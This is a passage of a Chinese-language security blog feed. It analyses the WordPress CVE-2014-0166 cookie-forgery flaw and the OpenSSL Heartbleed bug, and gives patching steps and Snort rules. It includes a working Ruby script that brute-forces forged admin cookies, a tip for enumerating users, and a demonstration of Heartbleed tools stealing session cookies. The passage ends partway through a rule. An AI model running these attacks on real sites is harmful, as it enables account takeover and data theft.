0eXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX、00eXXXXXXXXXXXXXXXXXXXXXXXXXXXXX….000000000000000000000000000eX、00000000000000000000000000000 (X = 0,1,2,3,4,5,6,7,8,9)&lt;/p&gt;

&lt;p&gt;故出現 $hash == 0 的機率為 Sum(10^n,n=0,30)/16^32 = 3.265262085617465e-09&lt;/p&gt;

&lt;p&gt;每次偽造的成功機率約為三億分之一，並不會很高，但已經足夠在一個月內拿到最高權限，而且所耗成本並不會很高。&lt;/p&gt;

&lt;h3 id=&quot;section-2&quot;&gt;實驗&lt;/h3&gt;

&lt;p&gt;為了驗證此方法之可行性，我們架設了 &lt;a href=&quot;http://tw.WordPress.org/WordPress-3.8.1-zh_TW.zip&quot;&gt;WordPress 3.8.1&lt;/a&gt; 環境。並且寫程式將登入 cookie 中的 hmac 設為 0，不斷調整 expiration 值測試是否已經登入，程式如下：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;httpclient&amp;#39;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;http&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;HTTPClient&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;cookie_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;WordPress_logged_in_de5be3cf9fcea023a1303527e10ea67a&amp;quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;timestamp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to_i&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;timestamp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;.timestamp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;800000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;http://domain.my/WordPress/&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;Cookie&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie_name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;=admin%7C&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;%7C0&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;include?&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;logout&amp;#39;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;admin%7C&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;%7C0&amp;quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;註：此程式為 POC，請自行調整為多執行緒版本，不然速度會很慢。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;經過一段長時間的等待，得到的結果如下：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-_iTb2VFAarU/U06kKNXwlzI/AAAAAAAAASo/KKIPDLcRaac/w402-h57-no/iTerm.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-_iTb2VFAarU/U06kKNXwlzI/AAAAAAAAASo/KKIPDLcRaac/w402-h57-no/iTerm.png&quot; alt=&quot;暴力偽造 cookie，直到成功登入&quot; title=&quot;暴力偽造 cookie，直到成功登入&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;得知當 cookie 中的 username 為 admin 且 expiration 值為 1421818232 時，伺服器算出來的 hmac 經過型態轉換會變成 0。我們將測試成功的 cookie 值： admin%7C1421818232%7C0 貼到瀏覽器上。成功變成 admin 如下圖，實驗成功！&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-Ccf0fswoJX0/U06kL69lmeI/AAAAAAAAASo/Biroo08YcQI/w978-h544-no/Mantra1.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-Ccf0fswoJX0/U06kL69lmeI/AAAAAAAAASo/Biroo08YcQI/w978-h544-no/Mantra1.png&quot; alt=&quot;利用偽造的 cookie 登入 WordPress&quot; title=&quot;利用偽造的 cookie 登入 WordPress&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;註：一般狀況，若不知道 WordPress 最高權限的帳號，可以利用 WordPress 的 feature 在 http://your.WordPress.com/?author=$id ($id: 1,2,3,4…,999,…) 頁面中列舉所有使用者帳號。通常 $id = 1 的 author 都有 WordPress 的管理權限。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;section-3&quot;&gt;結論&lt;/h3&gt;

&lt;p&gt;最近出現了一個高風險通報 CVE-2014-0166，其中提及 WordPress 在舊版驗證 cookie 的部分出現弱點，可以偽造合法 cookie，進而取得 WordPress 管理權限。本文分析了其原理，並且證實之。&lt;/p&gt;

&lt;p&gt;對於攻擊者而言，雖然每次偽造 cookie 成功的機率約為三億分之一並不高，但發送三億個 request 後或許能拿到最高權限，已經是值得投資的級數。&lt;/p&gt;

&lt;p&gt;對於 WordPress 管理者而言，建議立即更新至 3.8.2 以後版本，以免受到此風險攻擊。&lt;/p&gt;

&lt;p&gt;從此事件也提醒了 PHP 開發者，在撰寫重要的驗證行為，要特別注意 PHP 比較運算子的特性，請使用 === (不等於請用 !==)來保證等式左右型態與值為一樣，避免因為轉型造成的資安風險。&lt;/p&gt;

</content>
 </entry>
 
 <entry>
   <title>OpenSSL Heartbleed 全球駭客的殺戮祭典，你參與了嗎？</title>
   <link href="http://devco.re/blog/2014/04/11/openssl-heartbleed-how-to-hack-how-to-protect/"/>
   <updated>2014-04-11T00:00:00+08:00</updated>
   <id>http://devco.re/blog/2014/04/11/openssl-heartbleed-how-to-hack-how-to-protect</id>
   <content type="html">
&lt;p&gt;你跟上了 OpenSSL Heartbleed 的祭典了嗎？如果還沒有，別忘記詳細閱讀一下我們的前文「&lt;a href=&quot;http://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;OpenSSL CVE-2014-0160 Heartbleed 嚴重漏洞&lt;/a&gt;」。&lt;/p&gt;

&lt;p&gt;這幾天不少企業、民眾都不斷來詢問我們相對應的解決方案：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Heartbleed 跟我有關嗎？我該怎麼知道？&lt;/li&gt;
  &lt;li&gt;我該怎麼更新 OpenSSL？&lt;/li&gt;
  &lt;li&gt;我如果不能更新，要怎麼防止攻擊？&lt;/li&gt;
  &lt;li&gt;Heartbleed 漏洞攻擊者會怎麼利用？&lt;/li&gt;
  &lt;li&gt;目前受害的狀況如何？&lt;/li&gt;
  &lt;li&gt;我只是一般民眾，該如何應對？&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我相信不少人都有類似的疑問，我們以這篇專文補遺上次沒提到的資訊。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;section&quot;&gt;攻擊手法示範&lt;/h3&gt;

&lt;p&gt;大家都說 OpenSSL Heartbleed 漏洞可望為本年度最嚴重的漏洞，到底有多嚴重呢？我相信沒有看到攻擊的範例是沒有感覺的。大家可以先看看以下的影片，利用最先釋出的兩個簡單的 PoC exploit （弱點利用程式）「ssltest.py」以及「check-ssl-heartbleed.pl」，來檢測伺服器是否有 Heartbleed 問題。檢測的同時可以獲取伺服器記憶體中的資訊，其中就可能包含了機敏資訊。&lt;/p&gt;

&lt;p&gt;讓我們來看看吧！&lt;/p&gt;

&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;http://www.youtube.com/embed/kFGzu0-cIxE&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;

&lt;p&gt;首先利用 &lt;a href=&quot;http://pastebin.com/WmxzjkXJ&quot;&gt;ssltest.py&lt;/a&gt; 來測試，來看伺服器是否有被 heartbleed 漏洞影響，fbi.gov 在第三天已經修復這個問題。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-EeW6B_aOR7s/U0kWbYnPIPI/AAAAAAAAAQ8/o-WQ5rGGpOs/s2560/2014-04-11-openssl-heartbleed-detail-01-ssltest.py.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-EeW6B_aOR7s/U0kWbYnPIPI/AAAAAAAAAQ8/o-WQ5rGGpOs/w896-h678-no/2014-04-11-openssl-heartbleed-detail-01-ssltest.py.png&quot; alt=&quot;利用 ssltest.py 來測試伺服器是否有 Heartbleed 漏洞。&quot; title=&quot;利用 ssltest.py 來測試伺服器是否有 Heartbleed 漏洞。&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;如果是檢測一個有漏洞的網站，這個工具會直接把記憶體的內容顯示出來，其中可能包括 http 傳輸的資料、帳號密碼、私密金鑰等。在這個例子中，攻擊程式讀取到使用者送出的 form，若其中包含個資將會被一覽無遺，非常危險。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-csGMcT5ue6k/U0kWbdd0BTI/AAAAAAAAARI/_eJXbANavDw/s2560/2014-04-11-openssl-heartbleed-detail-02-ssltest.py-data.png&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-csGMcT5ue6k/U0kWbdd0BTI/AAAAAAAAARI/_eJXbANavDw/w896-h678-no/2014-04-11-openssl-heartbleed-detail-02-ssltest.py-data.png&quot; alt=&quot;利用 ssltest.py 抓出記憶體中的資料，其中包括 HTTP 傳輸內容。&quot; title=&quot;利用 ssltest.py 抓出記憶體中的資料，其中包括 HTTP 傳輸內容。&quot; /&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;另一個工具 &lt;a href=&quot;https://github.com/noxxi/p5-scripts/blob/master/check-ssl-heartbleed.pl&quot;&gt;check-ssl-heartbleed.pl&lt;/a&gt; 可以使用 -R 參數做更有效的利用。直接執行指令可以快速顯示伺服器有無問題。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-899EwdZRGgc/U0kWbbuSqLI/AAAAAAAAARE/1MUSueVzmV8/s2560/2014-04-11-openssl-heartbleed-detail-03-check-ssl-heartbleed.pl.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-899EwdZRGgc/U0kWbbuSqLI/AAAAAAAAARE/1MUSueVzmV8/w896-h678-no/2014-04-11-openssl-heartbleed-detail-03-check-ssl-heartbleed.pl.png&quot; alt=&quot;利用 check-ssl-heartbleed.pl 來檢查伺服器是否有 heartbleed 問題。&quot; title=&quot;利用 check-ssl-heartbleed.pl 來檢查伺服器是否有 heartbleed 問題。&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;如果使用「-R」參數並且指定特定的正規表示式，可以抓出想要獲取的資料。例如 Cookie、帳號密碼等。以此例，我們知道這個網站提供 &lt;a href=&quot;http://www.phpmyadmin.net&quot;&gt;phpMyAdmin&lt;/a&gt; 套件，因此直接鎖定「pmaPass」資料來抓取，沒想到第一次就抓到了。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-r_BgZxi8iAY/U0kWcfBjHtI/AAAAAAAAARM/UJ2o6sOlgx8/s2560/2014-04-11-openssl-heartbleed-detail-04-check-ssl-heartbleed.pl-data.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-r_BgZxi8iAY/U0kWcfBjHtI/AAAAAAAAARM/UJ2o6sOlgx8/w896-h678-no/2014-04-11-openssl-heartbleed-detail-04-check-ssl-heartbleed.pl-data.png&quot; alt=&quot;利用 check-ssl-heartbleed.pl 抓出特定機敏資料。&quot; title=&quot;利用 check-ssl-heartbleed.pl 抓出特定機敏資料。&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;接著攻擊者只要把這個獲取到的 Cookie 存入自己的瀏覽器中，就可以如影片中盜用這個帳號。是否很危險呢？&lt;/p&gt;

&lt;p&gt;除了這種利用方法之外，還有更多情況是直接把使用者登入的帳號密碼直接顯示出來的，因此如果伺服器沒有做好防禦或更新，整個網站的使用者資料都可以因此外洩。這也是為什麼我們一直強調伺服器管理者必須要更新金鑰、全站使用者帳號密碼等，以防有心人士借此撈取資料。&lt;/p&gt;

&lt;h3 id=&quot;heartbleed-&quot;&gt;誰在利用 Heartbleed 漏洞竊取資料呢？&lt;/h3&gt;

&lt;p&gt;由 github 上面的 &lt;a href=&quot;https://github.com/openssl/openssl/commit/4817504d069b4c5082161b02a22116ad75f822b1&quot;&gt;commit 記錄&lt;/a&gt;，出問題的那行程式碼是在 2011-12-31 22:59:57 commit 的，不知道是開發者太累還是 NSA 的陰謀。根據 Bloomberg 的&lt;a href=&quot;http://www.bloomberg.com/news/2014-04-11/nsa-said-to-have-used-heartbleed-bug-exposing-consumers.html&quot;&gt;報導&lt;/a&gt;指出，知情人士表示 NSA 早在&lt;strong&gt;兩年前&lt;/strong&gt;就已經知道此漏洞，並且&lt;strong&gt;利用這個漏洞竊取許多網站的機敏資料&lt;/strong&gt;。這代表 NSA 在一開始就知道這個漏洞，令人不禁有其他聯想。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The U.S. National Security Agency knew for at least two years about a flaw in the way that many websites send sensitive information, now dubbed the Heartbleed bug, and regularly used it to gather critical intelligence, two people familiar with the matter said.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;在之前&lt;a href=&quot;http://hitcon.org&quot;&gt;台灣駭客年會 (HITCON)&lt;/a&gt; 2013 的講師 Rahul Sasi (Garage4Hackers) 公布了&lt;a href=&quot;https://bitbucket.org/fb1h2s/cve-2014-0160/src/bba16b3eedef0e92bd91fea496b00c92eb515e29/Heartbeat_scanner.py?at=master&quot;&gt;大量掃描 Heartbleed 漏洞的程式&lt;/a&gt;，也可以供研究人員自行研究，或者是尋找自己管理的主機中有多少包含這個風險的。&lt;/p&gt;

&lt;h3 id=&quot;section-1&quot;&gt;常見問題&lt;/h3&gt;

&lt;h3 id=&quot;openssl-iis--heartbleed-&quot;&gt;OpenSSL 是什麼？IIS 會受 Heartbleed 漏洞影響嗎？&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://www.openssl.org&quot;&gt;OpenSSL&lt;/a&gt; 是一個函式庫（Library），在 UNIX 系列的服務若有使用 SSL，通常都會使用 OpenSSL。因此這次的漏洞並未影響微軟 IIS。&lt;/p&gt;

&lt;h3 id=&quot;openssl-098&quot;&gt;我使用 OpenSSL 0.9.8，太好了我用舊版我好安全！&lt;/h3&gt;

&lt;p&gt;你聽過 &lt;a href=&quot;http://en.wikipedia.org/wiki/Transport_Layer_Security#BEAST_attack&quot;&gt;BEAST&lt;/a&gt;, &lt;a href=&quot;http://en.wikipedia.org/wiki/BREACH_%28security_exploit%29&quot;&gt;BREACH&lt;/a&gt;, &lt;a href=&quot;http://en.wikipedia.org/wiki/CRIME_%28security_exploit%29&quot;&gt;CRIME&lt;/a&gt;, &lt;a href=&quot;http://www.isg.rhul.ac.uk/tls/Lucky13.html&quot;&gt;Lucky 13&lt;/a&gt; 嗎？&lt;/p&gt;

&lt;h3 id=&quot;https&quot;&gt;我沒有使用 HTTPS，所以我很安全！&lt;/h3&gt;

&lt;p&gt;。。。&lt;/p&gt;

&lt;h3 id=&quot;http-server&quot;&gt;只有網頁伺服器（HTTP Server）會受影響嗎？&lt;/h3&gt;

&lt;p&gt;不只！只要使用 OpenSSL 支援 STARTTLS 的服務都在影響範圍，包括 HTTPS、IMAPS、POPS、SMTPS 等伺服器。&lt;/p&gt;

&lt;h3 id=&quot;section-2&quot;&gt;只有自己架設的伺服器會受影響嗎？&lt;/h3&gt;

&lt;p&gt;當然不只！目前已經出現各大設備廠商都遭遇到這樣的問題。各大設備廠商、作業系統等影響狀況，可以參閱以下文章。&lt;/p&gt;

&lt;p&gt;CERT: OpenSSL heartbeat extension read overflow discloses sensitive information
&lt;a href=&quot;http://www.kb.cert.org/vuls/byvendor?searchview&amp;amp;Query=FIELD+Reference=720951&amp;amp;SearchOrder=4&quot;&gt;http://www.kb.cert.org/vuls/byvendor?searchview&amp;amp;Query=FIELD+Reference=720951&amp;amp;SearchOrder=4&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;廠商的設備目前狀況特別嚴重，因為所有同個版本的設備都會受影響，而在廠商釋出更新之前，只能被動的等待更新。若沒有繼續簽訂維護約的設備，也只能繼續跟廠商簽約更新，或者是看廠商是否可以直接提供更新檔。如果有 VPN Server 等服務更要注意，如果被攻擊者取得帳號密碼，等於如入無人之境，直接使用你的帳號登入到企業內網，不可不慎。&lt;/p&gt;

&lt;h3 id=&quot;section-3&quot;&gt;各家系統更新的速度？&lt;/h3&gt;

&lt;p&gt;引述自好朋友 Ant 的&lt;a href=&quot;http://blog.gcos.me/2014-04-10_openssl-cve-2014-0160-security-issue.html&quot;&gt;文章&lt;/a&gt;，各家作業系統、網站的更新速度，代表著企業重視資安的程度以及針對資安事件緊急應變的效率，也可以作為我們挑選系統、網站、廠商的依據。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;二、作業系統的更新進度&lt;/p&gt;

  &lt;p&gt;從資安事件的處理可以推敲出各作業系統商對於緊急事件的反應速度。
時間軸，按照修復的先後排列：&lt;/p&gt;

  &lt;ol&gt;
    &lt;li&gt;OpenSSL (資安弱點的主角) 第一次公開揭露的時間約在 2014年4月6日 0時。&lt;/li&gt;
    &lt;li&gt;RedHat 在 2014年4月7日 07:47:00 正式修復。&lt;/li&gt;
    &lt;li&gt;OpenSSL 正式確認並修復的時間約在 2014年4月7日16時。&lt;/li&gt;
    &lt;li&gt;OpenBSD 約在 2014年4月7日 20:17 正式修復。&lt;/li&gt;
    &lt;li&gt;Arch Linux 約在 2014年4月7日 20:36 正式修復。&lt;/li&gt;
    &lt;li&gt;Debian 約在 2014年4月7日 21:45 正式修復。&lt;/li&gt;
    &lt;li&gt;FreeBSD 約在 2014年4月7日 21:46 正式修復。&lt;/li&gt;
    &lt;li&gt;Ubuntu 約在 2014年4月7日 21:48 正式修復。
(2014年4月8日分隔區)&lt;/li&gt;
    &lt;li&gt;Fedora 約在 2014年4月8日 00:33 正式修復。&lt;/li&gt;
    &lt;li&gt;CentOS 約在 2014年4月8日 02:49 正式修復。&lt;/li&gt;
    &lt;li&gt;OpenSUSE 約在 2014年4月8日 05:32 正式修復。&lt;/li&gt;
    &lt;li&gt;Scentific 約在 2014年4月8日 08:27 正式修復。&lt;/li&gt;
    &lt;li&gt;Gentoo 約在 2014年4月8日 09:36 正式修復。&lt;/li&gt;
  &lt;/ol&gt;

  &lt;p&gt;重點整理：
1. RedHat 修復的速度比 OpenSSL 官方還快。
2. RedHat 派系的修復時間，除了 RedHat 外都算慢，如 Fedora 及 CentOS、Scentific，他們都比 RedHat 慢 16 小時以上。
3. Debian 派系的修復時間，如 Debian 及 Ubuntu，都比 RedHat 慢上至少 12 小時以上。
4. Gentoo 是列表中修復最慢的。
5. 若以資安黃金 6 小時來說，Fedora、CentOS、OpenSUSE、Scentific 及 Gentoo 都不及格。&lt;/p&gt;

  &lt;p&gt;三、大公司更新的速度&lt;/p&gt;

  &lt;p&gt;同樣地，從資安事件的處理可以推敲出各公司對於緊急事件的反應速度。&lt;/p&gt;

  &lt;p&gt;雲端相關公司
* Cloudflare 約在 2014年4月7日 11時修復。
* DigitalOcean 約在 2014年4月8日 12時修復。
* AWS 約在 2014年4月8日 12時修復。
* Linode 約在 2014年4月8日 14時修復。
* Heroku 約在 2014年4月8日 16時修復。&lt;/p&gt;

  &lt;p&gt;有些公司直到 2014年4月8日 16時都還沒修復。此時已離官方正式修復整整一天，也比上述機器數很多的雲端相關公司還慢。這些公司為，
* Yahoo.com / Flickr.com
* Kaspersky.com (資安公司)
* stackoverflow.com
* stackexchange .com
* php.net&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;感謝 StackNG 的補充：Cloudflare 於 2014 年 4 月 7 日 11 時公告，但在漏洞公告之前已經修復。&lt;/p&gt;

&lt;h3 id=&quot;section-4&quot;&gt;目前還有哪些伺服器有問題呢？&lt;/h3&gt;

&lt;p&gt;根據 &lt;a href=&quot;https://zmap.io/&quot;&gt;ZMap&lt;/a&gt; 的&lt;a href=&quot;https://zmap.io/heartbleed/&quot;&gt;研究報告&lt;/a&gt;指出，他們針對 &lt;a href=&quot;http://s3.amazonaws.com/alexa-static/top-1m.csv.zip&quot;&gt;Alexa 前一百萬個網站&lt;/a&gt;進行檢測，大約有 36% 的伺服器支援 TLS、7.6% 的伺服器含有此漏洞。ZMap 並提供了一個&lt;a href=&quot;https://zmap.io/heartbleed/vulnerable.html&quot;&gt;完整的清單&lt;/a&gt;列出在 2014/4/11 17:00 尚未修復漏洞的網站。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-5iuzr3g9s3U/U0lID8GrS4I/AAAAAAAAARw/Mi673wz-Jhc/s2560/2014-04-11-openssl-heartbleed-detail-06.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-5iuzr3g9s3U/U0lID8GrS4I/AAAAAAAAARw/Mi673wz-Jhc/w979-h586-no/2014-04-11-openssl-heartbleed-detail-06.png&quot; alt=&quot;ZMap.io Heartbleed vulnerable domains&quot; title=&quot;ZMap.io Heartbleed vulnerable domains&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;section-5&quot;&gt;有什麼值得測試的網站呢？&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-CiDaDbmxMK0/U0lGuQ6J1iI/AAAAAAAAARg/cZQSD4k7F40/s2560/2014-04-11-openssl-heartbleed-detail-05.jpg&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-CiDaDbmxMK0/U0lGuQ6J1iI/AAAAAAAAARg/cZQSD4k7F40/w687-h422-no/2014-04-11-openssl-heartbleed-detail-05.jpg&quot; alt=&quot;OpenSSL Heartbleed with a beer!&quot; title=&quot;OpenSSL Heartbleed with a beer!&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;via &lt;a href=&quot;https://www.facebook.com/photo.php?fbid=10201756684385494&quot;&gt;Facebook&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;openssl-&quot;&gt;我要怎麼更新 OpenSSL 呢？&lt;/h3&gt;

&lt;p&gt;根據不同的 Linux Distribution 有不同的更新方式，若有自己客製化一些程式設定，可能就需要自行更新。以下我們簡單介紹更新步驟：&lt;/p&gt;

&lt;p&gt;RedHat / CentOS / Fedora 系列更新套件：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;yum update
yum update openssl #只更新 OpenSSL
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Debian / Ubuntu 系列更新套件：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo apt-get update
sudo apt-get dist-upgrade
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;若只要更新 OpenSSL 則可以執行以下指令&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo apt-get install --only-upgrade openssl
sudo apt-get install --only-upgrade libssl1.0.0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;注意 OpenSSL 是否已經更新為修復的版本：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;rpm -q -a | grep &quot;openssl&quot;  # RedHat
dpkg -l | grep &quot;openssl&quot;    # Debian
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;接著請記得撤銷原本的簽章金鑰，重新簽署，並記得提交 CSR (Certificate Signing Request) 給 CA (Certification Authority)。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;openssl req -new -newkey rsa:2048 -nodes -keyout hostname.key -out hostname.csr
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;結束後記得重新啟動相關服務&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo service httpd restart      # RedHat
sudo service apache2 restart    # Debian
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;最後再使用檢測工具看自己的網頁伺服器或其他相關服務是否已經不在漏洞受害範圍。&lt;/p&gt;

&lt;h3 id=&quot;ids-&quot;&gt;我無法更新我的伺服器，我該怎麼在 IDS 偵測攻擊呢？&lt;/h3&gt;

&lt;p&gt;若你使用 Snort IDS，官方已經釋出 SID 30510 到 30517 來偵測，並且在 Community Rules 中也有包含。
&lt;a href=&quot;http://www.snort.org/snort-rules/#community&quot;&gt;http://www.snort.org/snort-rules/#community&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-console&quot; data-lang=&quot;console&quot;&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt; SIDs &lt;span class=&quot;m&quot;&gt;30510&lt;/span&gt; through &lt;span class=&quot;m&quot;&gt;30517&lt;/span&gt; address detection of the heartbleed attack 

&lt;span class=&quot;go&quot;&gt;alert tcp $EXTERNAL_NET any -&amp;gt; $HOME_NET 443 (msg:&amp;quot;SERVER-OTHER OpenSSL SSLv3 &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;heartbeat read overrun attempt&amp;quot;; flow:to_server,established; content:&amp;quot;|18 03 00|&amp;quot;; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;depth:3; dsize:&amp;gt;40; detection_filter:track by_src, count 3, seconds 1; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;metadata:policy balanced-ips drop, policy security-ips drop, service ssl;  &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;reference:cve,2014-0160; classtype:attempted-recon; sid:30510; rev:2;) &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;alert tcp $EXTERNAL_NET any -&amp;gt; $HOME_NET 443 (msg:&amp;quot;SERVER-OTHER OpenSSL TLSv1 &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;heartbeat read overrun attempt&amp;quot;; flow:to_server,established; content:&amp;quot;|18 03 01|&amp;quot;; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;depth:3; dsize:&amp;gt;40; detection_filter:track by_src, count 3, seconds 1; &lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;metadata:policy balanced-ips drop, policy security-ips drop, service ssl; &lt;/span&gt;
